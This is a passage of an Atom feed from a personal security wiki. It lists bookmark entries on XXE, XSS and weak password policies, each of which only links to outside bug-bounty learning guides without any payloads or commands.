&lt;li&gt;Hack tricks &lt;a href=&quot;https://book.hacktricks.xyz/&quot;&gt;https://book.hacktricks.xyz/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;CTF-wiki &lt;a href=&quot;https://ctf-wiki.org</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="140 Books" scheme="https://tsunamori.github.io/categories/100-Cyber-security/140-Books/"/>
    
    
    <category term="Books" scheme="https://tsunamori.github.io/tags/Books/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://tsunamori.github.io/wiki/XXE/"/>
    <id>https://tsunamori.github.io/wiki/XXE/</id>
    <published>2021-04-14T08:32:38.000Z</published>
    <updated>2021-04-28T03:10:08.856Z</updated>
    
    <content type="html"><![CDATA[<ol><li>XXE methods <a href="https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods">https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods</a></li><li>Learn XXE from zero to one <a href="https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556">https://newrouge.medium.com/xxe-from-zero-to-hero-b38118750556</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;XXE methods &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods&quot;&gt;https://kathan19.gitbook.io/howtohunt/xxe/xxe_methods&lt;/</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>XSS</title>
    <link href="https://tsunamori.github.io/wiki/XSS/"/>
    <id>https://tsunamori.github.io/wiki/XSS/</id>
    <published>2021-04-14T08:13:55.000Z</published>
    <updated>2021-04-14T08:32:21.245Z</updated>
    
    <content type="html"><![CDATA[<ol><li>XSS <a href="https://kathan19.gitbook.io/howtohunt/xss/xss">https://kathan19.gitbook.io/howtohunt/xss/xss</a></li><li>automated XSS <a href="https://kathan19.gitbook.io/howtohunt/xss/automated_xss">https://kathan19.gitbook.io/howtohunt/xss/automated_xss</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;XSS &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/xss/xss&quot;&gt;https://kathan19.gitbook.io/howtohunt/xss/xss&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;automated XS</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
  <entry>
    <title>Weak password</title>
    <link href="https://tsunamori.github.io/wiki/Weak-password/"/>
    <id>https://tsunamori.github.io/wiki/Weak-password/</id>
    <published>2021-04-14T08:10:29.000Z</published>
    <updated>2021-04-14T08:13:46.797Z</updated>
    
    <content type="html"><![CDATA[<ol><li>weak password policy <a href="https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy">https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;weak password policy &lt;a href=&quot;https://kathan19.gitbook.io/howtohunt/weak-password-policy/weak_password_policy&quot;&gt;https://kathan19.git</summary>
      
    
    
    
    <category term="100 Cyber security" scheme="https://tsunamori.github.io/categories/100-Cyber-security/"/>
    
    <category term="110 Bug bounty" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/"/>
    
    <category term="112 Ideas" scheme="https://tsunamori.github.io/categories/100-Cyber-security/110-Bug-bounty/112-Ideas/"/>
    
    
    <category term="Summary" scheme="https://tsunamori.github.io/tags/Summary/"/>
    
  </entry>
  
</feed>
